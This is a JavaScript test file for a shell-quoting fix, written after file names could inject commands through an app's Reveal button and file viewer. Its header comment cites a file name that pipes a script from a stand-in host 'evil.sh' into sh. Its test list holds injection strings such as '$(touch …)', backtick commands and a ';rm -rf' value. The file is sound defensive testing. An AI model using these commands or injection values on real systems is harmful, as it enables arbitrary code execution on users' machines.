// A file name was a command.
//
// FOLDERS' Reveal button and the shared file viewer built shell commands by wrapping a path
// in DOUBLE quotes and deleting any `"` inside it:
//
//     const qp = s => '"' + String(s).replace(/"/g,'') + '"';        // folders.js
//     'git -C "' + String(opts.cwd).replace(/"/g,'') + '" status …'  // lab.js
//
// Double quotes do not stop a shell. `$(…)`, backticks and `$VAR` all still expand inside
// them, so a file called  $(curl evil.sh|sh).txt  ran when you pressed Reveal, or merely
// opened it in the viewer — and the viewer is shared by FOLDERS, iT and SETTINGS.
//
// The galling part is that the correct quoter was already in the tree three times over, and
// shell.js:171 carries a comment saying so: "shq lived here as a second, safe copy of qpath
// while qpath itself was unsafe — one idea, two implementations." The lesson had been learnt
// in one file and not carried to the others. So there is now ONE definition, in the kernel,
// published like every other shared primitive, and these tests hold the line on both halves:
// the quoter is correct, and nobody rolls their own again.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { shq } from '../web/scripts/core/kernel.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (p) => readFileSync(path.join(ROOT, p), 'utf8');
const PANELS = readdirSync(path.join(ROOT, 'web', 'panels')).filter((f) => f.endsWith('.js'));

// A comment that QUOTES the banned pattern — "was '\"'+s.replace(/\"/g,'')+'\"'" — is exactly
// how the fix explains itself, and it tripped this test on its first green run. The assertion
// is about code. Line comments before block comments, or a // inside a block survives.
const decomment = (s) => s.replace(/^\s*\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/<!--[\s\S]*?-->/g, '');

// Every one of these is a real shell metacharacter sequence, run through a real zsh below.
const NASTY = [
  '$(touch /tmp/cfhub-pwned)',
  '`touch /tmp/cfhub-pwned2`',
  '$HOME/secrets',
  'a"b',
  "it's a file",
  'a;rm -rf /tmp/nothing',
  'a|b',
  'a&b',
  'a\nb',
  '*',
  '~',
  '\\',
  'file with spaces.txt',
];

test('the quoter survives a real zsh — every metacharacter comes back as itself', () => {
  for (const raw of NASTY) {
    // If the quoting is wrong, zsh either expands it, splits it, or runs it.
    const out = execFileSync('/bin/zsh', ['-c', 'printf %s ' + shq(raw)], { encoding: 'utf8' });
    assert.equal(out, raw, `zsh did not return the literal string for ${JSON.stringify(raw)}`);
  }
  // …and the double-quote version this replaced does NOT survive, which is the whole point.
  const unsafe = (s) => '"' + String(s).replace(/"/g, '') + '"';
  const expanded = execFileSync('/bin/zsh', ['-c', 'printf %s ' + unsafe('$HOME')], { encoding: 'utf8' });
  assert.notEqual(expanded, '$HOME', 'the old double-quote wrapper must be demonstrably unsafe, or this test proves nothing');
});

test('the kernel publishes shq to the panels, like every other shared primitive', () => {
  const k = read('web/scripts/core/kernel.js');
  assert.match(k, /export const shq\s*=/, 'shq must be a kernel export');
  assert.match(k, /Object\.assign\(window,\s*\{[^}]*\bshq\b/,
    'a panel sees kernel helpers only through the window exposure block — an export alone is invisible at runtime');
});

test('no panel rolls its own path quoter any more', () => {
  const offenders = [];
  for (const rel of ['web/index.html', ...PANELS.map((f) => 'web/panels/' + f)]) {
    const src = decomment(read(rel));
    // The exact shape that shipped: wrap in double quotes, delete the inner double quotes.
    for (const m of src.matchAll(/replace\(\/"\/g\s*,\s*''\)/g)) {
      offenders.push(`${rel}:${src.slice(0, m.index).split('\n').length}`);
    }
  }
  assert.deepEqual(offenders, [],
    'stripping `"` is not quoting — $(), backticks and $VAR still expand. Use shq:\n  ' + offenders.join('\n  '));
});

test('the three call sites that were already right now share the one definition', () => {
  // Pinned as a contract, not as an exact call: what matters is that no file re-derives it.
  const dupes = [];
  for (const rel of ['web/index.html', ...PANELS.map((f) => 'web/panels/' + f)]) {
    const src = decomment(read(rel));
    for (const m of src.matchAll(/replace\(\/'\/g\s*,\s*"'\\\\''"\)/g)) {
      dupes.push(`${rel}:${src.slice(0, m.index).split('\n').length}`);
    }
  }
  assert.deepEqual(dupes, [],
    'a second copy of the quoter is how the first one drifted. Call the kernel shq:\n  ' + dupes.join('\n  '));
});
